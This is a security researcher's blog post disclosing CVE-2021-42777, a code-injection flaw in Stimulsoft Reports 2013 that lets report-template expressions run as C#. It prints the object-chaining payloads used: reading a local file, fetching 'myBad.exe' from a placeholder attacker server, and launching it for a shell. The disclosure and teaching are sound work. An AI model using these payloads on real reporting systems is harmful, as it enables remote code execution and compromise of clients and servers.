=== Content from burninatorsec.blogspot.com_5aac1dfb_20250114_221736.html ===


# [Burninator Sec](http://burninatorsec.blogspot.com/)

This blog is about the educational (and sometimes entertainment) value of simple hacks. For active vulnerabilities, real names are concealed.

## Saturday, April 16, 2022

### Reporting Library RCE (Object Chaining) - CVE-2021-42777

Similar to [CVE-2020-15865](https://burninatorsec.blogspot.com/2018/11/reporting-c-serialization-remote-code.html).
However, this one was a little trickier because I could only execute chained C# commands that ultimately return an Object. This is a technique that can be used anywhere where user input is compiled by design, such as in template injection. In fact, hackers I've shared this story with had success using the concept across different languages and systems.

**Information Disclosure to RCE**

This started with a low severity issue - a verbose error message from the application when I typed SQL junk into the Report Editor, looking for a SQL injection. The errors contained CS1503 (C# compilation errors) returned from Stimulsoft Reports 2013.1.1600.0, so I was confident there was an RCE available:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg92UYC_MGNY-72-9yk11tctjNvC3UL-xN5SUtkyZ5Wh2hPga5vApfTijTv8oBkX4yuF3st1Sp0-vBh2VuBz9e9QP-sF2hy60Ne_XBMBquIYh6yih4-DD54r3mi0ymR_Jcwqyik9IW_A2h1CLJVuX789Srsj1xp9WhpuTTvKkj3q3ZzhUbNtQQxmRMN/s320/image001.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg92UYC_MGNY-72-9yk11tctjNvC3UL-xN5SUtkyZ5Wh2hPga5vApfTijTv8oBkX4yuF3st1Sp0-vBh2VuBz9e9QP-sF2hy60Ne_XBMBquIYh6yih4-DD54r3mi0ymR_Jcwqyik9IW_A2h1CLJVuX789Srsj1xp9WhpuTTvKkj3q3ZzhUbNtQQxmRMN/s547/image001.png)

So, after trying a few C# commands, I eventually I got errors like:

C:\User\burninator\AppData\Local\Temp\klqskh4k.0.cs(578,74): error CS1502: The best overloaded method match for '\*\*\*\*.ToString(object,object,bool)' has some invalid arguments: error CS1503: Argument 2: cannot convert from method group' to 'object'

Bingo! I love to hear that something is being converted, and in a function we apparently have control over. This error is a wonderful window into how this works. I can tell from the error that it will only compile and execute successfully if we give it something that it can interpret as an Object. I tested this by sending {new Object()}, and it compiled without error! These work too but they're not that helpful (yet):

{new System.Diagnostics.Process()}

{System.Math.Ceiling}

{new System.Diagnostics.StackTrace(true).GetFrame(1).GetMethod()}

So, how can I weaponize this? Since this is a local thick client application, the first step is to figure out if it's going to execute these commands locally or on the application web server it's connected to. Surprise! It actually does both, since I was able to chain this with other functionality to make it launch server side AND locally. But first let's find proof that we can inject a malicious command...

To find out, I read the manual. I actually READ the manual for the C# language. I know, I know. Disgusting. It's a taboo I didn't even do and would never have done when I was a developer. But it was important here, because I needed to find attack chains that would let me:

1.)  execute a command on the local machine (pop calc.exe)

2.) execute a command locally to make the remote server do an external DNS hit POC and then make it download/write/execute the file

It reminded me a lot of Object Deserialization gadget/widget chains in YsoSerial, which are well known internal commands or system objects that aid with command injection and execution (i.e.http://gursevkalra.blogspot.com/2016/01/ysoserial-commonscollections1-exploit.html ). But given my constraints, I had to create my own.
If you aren't familiar with Objects in Object Oriented Programming languages, here's a quick rundown from my presentation on Object Attacks and how I used them in this context. The class definitions are from the C# manual:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggF9DyPUYZOQ7WDCzhOem-9kDT3yCDC4foq1sA3KHfFJc5WAMCi1-ly5QTIOpNV4KoQrtP73JP28tRqRfRXsKTFm84ZX3QjE91wOE_6ALIez1WisMu3nnP9J0E4MxI5gzVm-GJcx5tVb6pwA0aX9ESgJxI3pwoKU1gxQVLCOSGu1sXlxGQYciAuj1j/w400-h209/image001.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggF9DyPUYZOQ7WDCzhOem-9kDT3yCDC4foq1sA3KHfFJc5WAMCi1-ly5QTIOpNV4KoQrtP73JP28tRqRfRXsKTFm84ZX3QjE91wOE_6ALIez1WisMu3nnP9J0E4MxI5gzVm-GJcx5tVb6pwA0aX9ESgJxI3pwoKU1gxQVLCOSGu1sXlxGQYciAuj1j/s864/image001.png){System.IO.File.ReadAllText(@"dontlook.txt")}
(NOTE: the curly brackets are for the templating system, they're not valid C#)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcVeo6zYyXUP30hXYgU9B5BzHt1yjCfIorHHsWmd7I5RZOZNkNDW3TsK-DtsOK98E-PNWlucBjjdPTljIgVfS9Lv9pJH2GNpNMYTAvXsRAevL4_XxuL2c6fkEe1BYYoPQJTIn5ynxJb5HPebVtmYjyisvde7yW_a4j7_PTE3CajYtxGCMk8wxxvZvt/w400-h188/image002.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcVeo6zYyXUP30hXYgU9B5BzHt1yjCfIorHHsWmd7I5RZOZNkNDW3TsK-DtsOK98E-PNWlucBjjdPTljIgVfS9Lv9pJH2GNpNMYTAvXsRAevL4_XxuL2c6fkEe1BYYoPQJTIn5ynxJb5HPebVtmYjyisvde7yW_a4j7_PTE3CajYtxGCMk8wxxvZvt/s865/image002.png){System.Net.WebRequest.Create("https://ATTACKSERVER:8000/myBad.exe").GetResponse().GetResponseStream()}

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwjqmP7XOvOvZt6iFsx4MWcbNUwNipYpJHFIrWFkL2IvthY9VaWkwpok2U2jUMtrwlRH9xSegKs5vFMDg6JYQsBbjg2bkGMtf6v-jESNJQaZDNcCdk30prDDP6TxkjIrS7pWXff4l05Q2fI31sMuXnfHlL0n3Bhy3pub4q5HhwNan1QD80W19ursC0/w400-h198/image003.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwjqmP7XOvOvZt6iFsx4MWcbNUwNipYpJHFIrWFkL2IvthY9VaWkwpok2U2jUMtrwlRH9xSegKs5vFMDg6JYQsBbjg2bkGMtf6v-jESNJQaZDNcCdk30prDDP6TxkjIrS7pWXff4l05Q2fI31sMuXnfHlL0n3Bhy3pub4q5HhwNan1QD80W19ursC0/s892/image003.png){System.Diagnostics.Process.Start("myBad.exe")}

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_dLGsH2kVQ8S3-ltPR5Pljk2tA1hLB2kyYGKAo56m1oQEfvICJ50xuz6ywe5On33n8APQTvt8NKmfX6MzAE0ALr4MzJ689d2n5l_iqvuue2JwDoEfhB7PBNjGoGlctFEiSSB-YWX7dFOFmuqyfzoTT5RLOSrnmaJM64VKxaUYD1TYMLssdf9Utl3i/w400-h206/image004.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_dLGsH2kVQ8S3-ltPR5Pljk2tA1hLB2kyYGKAo56m1oQEfvICJ50xuz6ywe5On33n8APQTvt8NKmfX6MzAE0ALr4MzJ689d2n5l_iqvuue2JwDoEfhB7PBNjGoGlctFEiSSB-YWX7dFOFmuqyfzoTT5RLOSrnmaJM64VKxaUYD1TYMLssdf9Utl3i/s844/image004.png)

That's how I got one of the weirdest shells ever.

<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42777>

Also, now that I've written this out, I realize that by far the least fun part of this exploit was reading the C# manual to find interesting File IO and Networking gadget chains that return Objects... it was a lot of 2am nights. So I think I will end up automating that process, if something like it doesn't already exist.

Posted by
burninator

at

[10:08 AM](http://burninatorsec.blogspot.com/2022/04/library-rce-object-chaining-cve-2021.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=5709475200071837744&postID=7565423925189720080&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=7565423925189720080&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=7565423925189720080&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=7565423925189720080&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=7565423925189720080&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=5709475200071837744&postID=7565423925189720080&target=pinterest "Share to Pinterest")

#### No comments:

#### Post a Comment

[Newer Post](http://burninatorsec.blogspot.com/2022/07/twitter-removed-blocked-account-export.html "Newer Post")

[Older Post](http://burninatorsec.blogspot.com/2022/01/post-exploitation-pii-search-across-all.html "Older Post")

[Home](http://burninatorsec.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](http://burninatorsec.blogspot.com/feeds/7565423925189720080/comments/default)

## Twitter

@burninatorsec

## Disclaimer

Information in this blog is for educational purposes only. I am not liable for damages or illegal activity caused directly or indirectly based on the information shared here.

## Archive

* ►
  [2024](http://burninatorsec.blogspot.com/2024/)
  (1)
  + ►
    [November](http://burninatorsec.blogspot.com/2024/11/)
    (1)

* ▼
  [2022](http://burninatorsec.blogspot.com/2022/)
  (6)
  + ►
    [December](http://burninatorsec.blogspot.com/2022/12/)
    (1)
  + ►
    [November](http://burninatorsec.blogspot.com/2022/11/)
    (2)
  + ►
    [July](http://burninatorsec.blogspot.com/2022/07/)
    (1)
  + ▼
    [April](http://burninatorsec.blogspot.com/2022/04/)
    (1)
    - [Reporting Library RCE (Object Chaining) - CVE-2021...](http://burninatorsec.blogspot.com/2022/04/library-rce-object-chaining-cve-2021.html)
  + ►
    [January](http://burninatorsec.blogspot.com/2022/01/)
    (1)

* ►
  [2021](http://burninatorsec.blogspot.com/2021/)
  (8)
  + ►
    [July](http://burninatorsec.blogspot.com/2021/07/)
    (1)
  + ►
    [June](http://burninatorsec.blogspot.com/2021/06/)
    (1)
  + ►
    [April](http://burninatorsec.blogspot.com/2021/04/)
    (6)

* ►
  [2020](http://burninatorsec.blogspot.com/2020/)
  (7)
  + ►
    [November](http://burninatorsec.blogspot.com/2020/11/)
    (1)
  + ►
    [October](http://burninatorsec.blogspot.com/2020/10/)
    (2)
  + ►
    [September](http://burninatorsec.blogspot.com/2020/09/)
    (1)
  + ►
    [August](http://burninatorsec.blogspot.com/2020/08/)
    (1)
  + ►
    [April](http://burninatorsec.blogspot.com/2020/04/)
    (2)

* ►
  [2019](http://burninatorsec.blogspot.com/2019/)
  (5)
  + ►
    [July](http://burninatorsec.blogspot.com/2019/07/)
    (2)
  + ►
    [June](http://burninatorsec.blogspot.com/2019/06/)
    (1)
  + ►
    [May](http://burninatorsec.blogspot.com/2019/05/)
    (2)

* ►
  [2018](http://burninatorsec.blogspot.com/2018/)
  (8)
  + ►
    [November](http://burninatorsec.blogspot.com/2018/11/)
    (1)
  + ►
    [August](http://burninatorsec.blogspot.com/2018/08/)
    (1)
  + ►
    [July](http://burninatorsec.blogspot.com/2018/07/)
    (3)
  + ►
    [May](http://burninatorsec.blogspot.com/2018/05/)
    (1)
  + ►
    [April](http://burninatorsec.blogspot.com/2018/04/)
    (1)
  + ►
    [March](http://burninatorsec.blogspot.com/2018/03/)
    (1)

* ►
  [2014](http://burninatorsec.blogspot.com/2014/)
  (1)
  + ►
    [November](http://burninatorsec.blogspot.com/2014/11/)
    (1)

* ►
  [2013](http://burninatorsec.blogspot.com/2013/)
  (8)
  + ►
    [October](http://burninatorsec.blogspot.com/2013/10/)
    (1)
  + ►
    [August](http://burninatorsec.blogspot.com/2013/08/)
    (1)
  + ►
    [July](http://burninatorsec.blogspot.com/2013/07/)
    (1)
  + ►
    [June](http://burninatorsec.blogspot.com/2013/06/)
    (5)

|  |  |
| --- | --- |

Awesome Inc. theme. Powered by [Blogger](https://www.blogger.com).


